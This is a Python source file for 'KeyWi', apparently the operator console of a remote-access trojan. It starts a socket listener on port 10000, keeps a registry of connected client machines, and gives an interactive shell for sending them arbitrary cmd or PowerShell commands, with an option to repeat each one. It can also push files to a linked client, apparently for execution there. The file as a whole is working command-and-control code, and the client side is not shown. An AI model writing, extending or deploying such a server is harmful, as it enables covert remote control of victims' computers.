import cmd
import os
import time
import subprocess
import platform
import re
from pyfiglet import Figlet
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
import socket
import threading
import shlex
import struct


def resize_terminal():
    os.system('mode con: cols=150 lines=35')  # Width=120, Height=40
resize_terminal()

console = Console()



clients = {}
client_sockets = {}
selected_ip = None
def start_listener():
    host = '0.0.0.0'
    port = 10000
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)

    

    while True:
        client_socket, addr = server_socket.accept()
        console.print(f"[cyan]Connection established with {addr}[/cyan]")
        clients[addr[0]] = {'name': 'Unknown', 'status': 'online'}
        
        client_sockets[addr[0]] = client_socket

        

        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
def handle_client(client_socket, addr):
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(f"Received from {addr[0]}: {data}")
        except Exception as e:
            print(f"Error with client {addr[0]}: {e}")
            break

    client_socket.close()
    del clients[addr[0]]
    del client_sockets[addr[0]]
    

def ping_host(host):
    system = platform.system()
    
    if system == "Windows":
        cmd = ["ping", "-n", "1", host]
    else:
        cmd = ["ping", "-c", "1", host]

    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, universal_newlines=True)
        # Match "time=XXms" on Windows or "time=XX ms" on Unix
        match = re.search(r"time[=<]?\s*([\d.]+)\s*ms", output)
        if match:
            return f"{host} replied in {match.group(1)} ms"
        else:
            return f"{host} did not respond with time info."
    except subprocess.CalledProcessError as e:
        return f"Ping failed: {e.output.strip()}"


def slow_type(text, delay=0.01):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def remote_execute(command):
    return f"[green]Executed remotely:[/green] {command}"

def send_file_to_client(file_path, client_socket, adress):
    
    if client_socket:
        try:
            # Get file size
            file_size = os.path.getsize(file_path)

            # Send file header with file name and file size
            client_socket.send(f"file:{os.path.basename(file_path)}".encode())
            time.sleep(0.01) # Short delay to ensure separate sends

            # Send file size in 8-byte format
            client_socket.send(struct.pack('>Q', file_size)) # 8 bytes, big-endian

            # Send the actual file data
            with open(file_path, 'rb') as f:
                while chunk := f.read(1024):
                    client_socket.send(chunk)

            console.print(f"[green]File Sent[/green]", f"File [yellow]''{os.path.basename(file_path)}''[/yellow] sent to {adress}")
        except Exception as e: 
            console.print(f"[red]Error, Failed to send the file: {e}[/red]")
    else:
        console.print(f"[red]Error, No client connected to send this file.[/red]")


class KeyWiShell(cmd.Cmd):
    prompt = "KeyWi > "

    def __init__(self):
        super().__init__()
        self.selected_ip = None
        self.client_sockets = client_sockets

    def preloop(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        show_banner()
    def do_list(self, arg):
        """Show a list of active adresses"""
        console.print(f"[green]{clients}[/green]")

    def do_link(self, arg):
        """Links provided address to server"""
        
        
        # Check if an argument (IP address) is provided
        if arg.strip():
            self.selected_ip = arg.strip()  # Set selected_ip to the provided address
            if self.selected_ip in clients:
                console.print(f"[cyan]Successfully linked to {self.selected_ip}[/cyan]")
            else:
                console.print(f"[red]Address {self.selected_ip} not found in clients[/red]")
        else:
            # If no address is provided, try to link to the first client in the clients dictionary
            try:
                if clients:
                    self.selected_ip = list(clients.keys())[0]  # Select the first client IP
                    console.print(f"[cyan]Successfully linked to {self.selected_ip}[/cyan]")
                else:
                    console.print("[red]No clients available to link[/red]")
            except IndexError:
                console.print("[red]Problem linking to address[/red]")

    def do_testexe(self, arg):
        command = arg
        client_socket = client_sockets[self.selected_ip]
        if client_socket:
            client_socket.send(command.encode())

    def do_test(self, arg):
        console.print(self.selected_ip)


    def do_start(self, arg):
        

        file_path = arg.strip('"')
        send_file_to_client(file_path, client_sockets[self.selected_ip], self.selected_ip)


    def do_exec(self, arg):
        """
        Usage: exec [-p] [-r repeat_count] <command>
        -p                 Run the command using PowerShell
        -r <count>         Repeat the command N times (default: 1)
        Example: exec -p -r 5 start calc
        """
        if not arg:
            console.print("[bold red]Error:[/bold red] No command provided.")
            return

        try:
            tokens = shlex.split(arg)
        except ValueError as e:
            console.print(f"[bold red]Error parsing input:[/bold red] {e}")
            return

        is_powershell = False
        repeat_count = 1

        i = 0
        while i < len(tokens):
            if tokens[i] == "-p":
                is_powershell = True
                tokens.pop(i)
            elif tokens[i] == "-r":
                try:
                    repeat_count = int(tokens[i + 1])
                    tokens.pop(i)
                    tokens.pop(i)
                except (IndexError, ValueError):
                    console.print("[bold red]Error:[/bold red] Invalid repeat count.")
                    return
            else:
                i += 1

        command = " ".join(tokens)

        if not command:
            console.print("[bold red]Error:[/bold red] No command provided after flags.")
            return

        if not hasattr(self, "selected_ip") or not self.selected_ip:
            console.print("[bold red]Error:[/bold red] No client selected.")
            return

        client_socket = self.client_sockets.get(self.selected_ip)
        if not client_socket:
            console.print(f"[bold red]Error:[/bold red] No socket for selected IP: {self.selected_ip}")
            return

        for _ in range(repeat_count):
            try:
                prefix = "powershell:" if is_powershell else ""
                client_socket.send(f"{prefix}{command}".encode())
                time.sleep(0.01)
            except Exception as e:
                console.print(f"[bold red]Error sending command:[/bold red] {e}")
                return

        console.print(f"[green]Command sent {repeat_count} time(s) to {self.selected_ip}[/green]")

    

    def do_exit(self, arg):
        """Exit the shell"""
        console.print("[bold red]Exiting...[/bold red]")
        return True

    def do_clear(self, arg):
        """Clear the screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        show_banner()
    def do_ping(self, arg):
        "Ping a host and show response time: ping <host>"
        if not arg:
            console.print("[red]Usage:[/red] ping <host>")
            return
        result = ping_host(arg)
        console.print(f"[green]{result}[/green]")

    def emptyline(self):
        pass

# --------------------------
# Banner Stuff
# --------------------------

def show_banner():
    f = Figlet(font='slant')
    ascii_art = r"""
    .   __ __     .    _       ___  .    .
    .  / //_/__ .__  _| |  .  / (_)
      / ,< / _ \/ / / / | /| /./ /    .     .
     / /| / .__/ /_/ /| |/ |/ / /        .
    /_/ |_\___/\__,./ |__/|__/_/   .
      .   .   /____/       .                                                                       
    """

    cat_ascii = r"""
     /\_/\           
    ( o.o )        
     > ^ <           
             
    """
    combined_ascii = ascii_art 
    green_text = Text(combined_ascii.rstrip(), style="green")
    green_text = Text(combined_ascii.rstrip(), style="green")

    # Directly print the text with alignment without using Panel
    console.print((green_text))
    console.print(Text(cat_ascii.rstrip(), style="green"))
    # Optional: typing intro
    console.print("[bold bright_black]KeyWi initialized. Type 'help' to see commands.[/bold bright_black]")

# --------------------------
# Run the shell
# --------------------------

if __name__ == '__main__':
    threading.Thread(target=start_listener, daemon=True).start()
    KeyWiShell().cmdloop()


